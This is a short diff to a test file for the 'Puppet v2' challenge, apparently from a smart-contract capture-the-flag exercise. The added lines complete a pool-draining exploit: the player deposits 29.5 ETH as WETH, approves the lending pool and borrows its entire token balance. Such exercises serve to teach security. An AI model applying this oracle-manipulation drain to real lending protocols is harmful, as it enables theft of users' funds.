@@ -136,6 +136,13 @@ describe("[Challenge] Puppet v2", function () {
       "Amount required to drain the pool",
       ethers.utils.formatEther(amountIn.toString())
     );
+    await weth
+      .connect(player)
+      .deposit({ value: ethers.utils.parseEther("29.5") });
+    await weth
+      .connect(player)
+      .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
+    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
